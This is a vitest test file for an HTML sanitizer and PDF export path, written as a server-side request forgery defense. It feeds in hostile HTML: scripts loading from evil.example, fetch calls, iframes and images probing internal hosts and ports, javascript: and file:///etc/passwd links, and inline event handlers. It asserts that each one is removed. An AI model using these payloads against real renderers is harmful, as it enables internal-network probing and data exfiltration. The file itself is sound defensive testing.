import { describe, expect, it, vi } from "vitest";
import { sanitizeHtmlForExport } from "./sanitize-html.js";
import {
  createHeadlessChromiumPdfRenderer,
  type PlaywrightChromiumModule,
} from "./chromium.js";
import { exportDocsDocumentWithProviders } from "./formats.js";

describe("sanitizeHtmlForExport (CRITICAL-6 SSRF defense)", () => {
  it("strips <script> tags and their contents", () => {
    const out = sanitizeHtmlForExport(
      '<h1>Hi</h1><script src="http://evil.example/x"></script><script>fetch("http://evil")</script><p>Body</p>',
    );
    expect(out).not.toContain("script");
    expect(out).not.toContain("evil.example");
    expect(out).not.toContain("fetch(");
    expect(out).toContain("<h1>");
    expect(out).toContain("<p>");
  });

  it("strips <iframe>, <object>, <embed>, <link>, <base>, <svg>, <math>, <portal>", () => {
    const out = sanitizeHtmlForExport(`
      <iframe src="http://internal-service:5432/"></iframe>
      <object data="http://internal-service:5432/"></object>
      <embed src="http://internal-service:5432/" />
      <link rel="preconnect" href="http://internal-service:5432/" />
      <link rel="prefetch" href="http://internal-service:5432/" />
      <link rel="dns-prefetch" href="http://internal-service:5432/" />
      <link rel="stylesheet" href="http://evil.example/x.css" />
      <base href="http://evil.example/" />
      <svg><image href="http://internal-service:5432/" /></svg>
      <math><mtext>x</mtext></math>
      <portal src="http://evil.example/" />
      <p>kept</p>
    `);
    expect(out).not.toMatch(/iframe|object|embed|link|base|svg|math|portal/i);
    expect(out).not.toContain("internal-service");
    expect(out).not.toContain("evil.example");
    expect(out).toContain("<p>kept</p>");
  });

  it("strips javascript: and data: URLs from href, keeps http(s) and #fragments", () => {
    const out = sanitizeHtmlForExport(
      [
        '<a href="javascript:alert(1)">x1</a>',
        '<a href="JaVaScRiPt:alert(2)">x2</a>',
        '<a href="data:text/html,<script>1</script>">x3</a>',
        '<a href="vbscript:msgbox(1)">x4</a>',
        '<a href="file:///etc/passwd">x5</a>',
        '<a href="ftp://evil/x">x6</a>',
        '<a href="https://example.com/safe">x7</a>',
        '<a href="#heading-2">x8</a>',
      ].join(""),
    );
    expect(out).not.toContain("javascript:");
    expect(out).not.toContain("JaVaScRiPt:");
    expect(out).not.toContain("vbscript:");
    expect(out).not.toContain("data:text/html");
    expect(out).not.toContain("file://");
    expect(out).not.toContain("ftp://");
    expect(out).toContain('href="https://example.com/safe"');
    expect(out).toContain('href="#heading-2"');
  });

  it("strips on* event-handler attributes", () => {
    const out = sanitizeHtmlForExport(
      '<p onclick="x()" onload="y()" onmouseover="z()">Body</p><img src="x" onerror="evil()" />',
    );
    expect(out).not.toMatch(/onclick|onload|onmouseover|onerror/i);
    expect(out).toContain("<p>Body</p>");
  });

  it("strips srcdoc and xlink:href to block subresource and SVG fetch vectors", () => {
    const out = sanitizeHtmlForExport(
      '<iframe srcdoc="<script>fetch(1)</script>"></iframe><a xlink:href="http://evil/">x</a>',
    );
    expect(out).not.toContain("srcdoc");
    expect(out).not.toContain("xlink:href");
    expect(out).not.toContain("script");
  });

  it("removes <img> src entirely (we don't allowlist src) — no Chromium network fetch possible", () => {
    const out = sanitizeHtmlForExport(
      '<img src="http://internal-service:5432/" alt="x" /><img src="http://evil.example/track.gif" />',
    );
    expect(out).not.toContain("http://");
    expect(out).not.toContain("internal-service");
    expect(out).not.toContain("evil.example");
    // The tag survives — only the src is dropped.
    expect(out).toContain("<img");
  });

  it("preserves typical Helix document HTML intact (h1/h2/p/a/strong/em/ul/li)", () => {
    const out = sanitizeHtmlForExport(
      '<h1>Title</h1><p>Body with <strong>bold</strong> and <em>italic</em> and <a href="https://example.com">link</a>.</p><ul><li>One</li><li>Two</li></ul>',
    );
    expect(out).toContain("<h1>Title</h1>");
    expect(out).toContain("<strong>bold</strong>");
    expect(out).toContain("<em>italic</em>");
    expect(out).toContain('<a href="https://example.com">link</a>');
    expect(out).toContain("<ul>");
    expect(out).toContain("<li>One</li>");
  });

  it("preserves <style> CSS payload but never resurrects a removed script", () => {
    const out = sanitizeHtmlForExport(
      '<style>@page { size: A4; } body { color: #111; }</style><script>fetch("http://evil")</script>',
    );
    expect(out).toContain("@page");
    expect(out).toContain("body { color: #111; }");
    expect(out).not.toContain("fetch(");
  });
});

describe("PDF export end-to-end with malicious document HTML", () => {
  const baseDoc = {
    id: "33333333-3333-4333-8333-333333333333",
    orgId: "org-1",
    title: "Doc",
    markdown: "## Hello\nBody.",
    outline: [],
    comments: [],
  };

  it("never fetches URLs referenced by malicious document HTML", async () => {
    const fetchedUrls: string[] = [];
    const abort = vi.fn(async () => {});
    let handler: ((route: { abort(): Promise<void> }) => Promise<void>) | null = null;
    const route = vi.fn(
      async (
        _url: string,
        registered: (route: { abort(): Promise<void> }) => Promise<void>,
      ) => {
        handler = registered;
      },
    );
    let capturedHtml = "";
    const setContent = vi.fn(async (html: string) => {
      capturedHtml = html;
    });
    const pdf = vi.fn(async () => new Uint8Array([0x25, 0x50, 0x44, 0x46]));
    const newPage = vi.fn(async () => ({ route, setContent, pdf }));
    const launch = vi.fn(async () => ({ newPage, close: vi.fn(async () => {}) }));
    const playwright: PlaywrightChromiumModule = { chromium: { launch } };

    const renderer = createHeadlessChromiumPdfRenderer({
      loadPlaywright: async () => playwright,
    });

    const maliciousDoc = {
      ...baseDoc,
      html: [
        // External script (data exfil + SSRF).
        '<script src="http://evil.example/x"></script>',
        // Internal-network subresource probe (Postgres port).
        '<img src="http://internal-service:5432/" />',
        // External stylesheet preconnect.
        '<link rel="preconnect" href="http://internal.helix.svc.cluster.local/" />',
        '<link rel="dns-prefetch" href="http://10.0.0.1/" />',
        // Inline event handler.
        '<p onclick="fetch(\'http://evil\')">Body</p>',
        // Iframe to internal admin.
        '<iframe src="http://localhost:8080/admin"></iframe>',
        // javascript: link.
        '<a href="javascript:alert(1)">click</a>',
        // Regular content that should survive.
        "<h1>Real Title</h1><p>Real body.</p>",
      ].join(""),
    };

    await exportDocsDocumentWithProviders(
      { document: maliciousDoc, format: "pdf" },
      { pdfRenderer: renderer },
    );

    // 1. The sanitized HTML must not carry any of the malicious URLs.
    expect(capturedHtml).not.toContain("evil.example");
    expect(capturedHtml).not.toContain("internal-service");
    expect(capturedHtml).not.toContain("internal.helix.svc.cluster.local");
    expect(capturedHtml).not.toContain("10.0.0.1");
    expect(capturedHtml).not.toContain("localhost:8080");
    expect(capturedHtml).not.toContain("javascript:");
    expect(capturedHtml).not.toMatch(/<script|<iframe|<link|onclick/i);
    // 2. The benign content survives.
    expect(capturedHtml).toContain("<h1>Real Title</h1>");
    expect(capturedHtml).toContain("Real body.");
    // 3. The route abort handler is installed BEFORE setContent.
    expect(route).toHaveBeenCalledTimes(1);
    expect(route.mock.invocationCallOrder[0]).toBeLessThan(
      setContent.mock.invocationCallOrder[0] ?? Number.POSITIVE_INFINITY,
    );
    // 4. If Chromium ever did try to fetch something, it would be aborted.
    expect(handler).not.toBeNull();
    // eslint-disable-next-line @typescript-eslint/no-non-null-assertion
    await handler!({
      abort: async () => {
        fetchedUrls.push("would-have-fetched");
      },
    });
    expect(fetchedUrls).toEqual(["would-have-fetched"]);
    expect(abort).toHaveBeenCalledTimes(0);
  });

  it("renders normal Helix document HTML unchanged through the sanitizer", async () => {
    let capturedHtml = "";
    const setContent = vi.fn(async (html: string) => {
      capturedHtml = html;
    });
    const newPage = vi.fn(async () => ({
      route: vi.fn(async () => {}),
      setContent,
      pdf: vi.fn(async () => new Uint8Array([0x25, 0x50, 0x44, 0x46])),
    }));
    const launch = vi.fn(async () => ({ newPage, close: vi.fn(async () => {}) }));
    const renderer = createHeadlessChromiumPdfRenderer({
      loadPlaywright: async (): Promise<PlaywrightChromiumModule> => ({
        chromium: { launch },
      }),
    });

    await exportDocsDocumentWithProviders(
      {
        document: {
          ...baseDoc,
          html:
            '<h1>Roadmap</h1><p>Ship <strong>PDF</strong> exports — see <a href="#goals">Goals</a>.</p><ul><li>Item 1</li><li>Item 2</li></ul>',
        },
        format: "pdf",
      },
      { pdfRenderer: renderer },
    );

    expect(capturedHtml).toContain("<h1>Roadmap</h1>");
    expect(capturedHtml).toContain("<strong>PDF</strong>");
    expect(capturedHtml).toContain('<a href="#goals">Goals</a>');
    expect(capturedHtml).toContain("<ul>");
    expect(capturedHtml).toContain("<li>Item 1</li>");
  });
});
